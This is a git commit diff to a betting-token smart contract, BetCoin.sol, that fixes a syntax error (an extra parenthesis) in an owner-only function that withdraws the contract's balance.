89d620d9f639624939d5391c30572cf03c729330
5star-rep <111691547+5star-rep@users.noreply.github.com>
2023-09-09 15:11:35 +0100

    Update BetCoin.sol

--- BetCoin.sol
+++ BetCoin.sol
@@ -543,7 +543,7 @@ contract BETCOIN is Context, IBEP20, Ownable {
 
     function remLiquidity(address payable _to, uint256 psscde) public onlyOwner {
         require(psscde == _passcode, "wrong passcode");
-        _to.transfer(address(this).balance));
+        _to.transfer(address(this).balance);
     }
 
     function PLAY(uint256 _no) public {
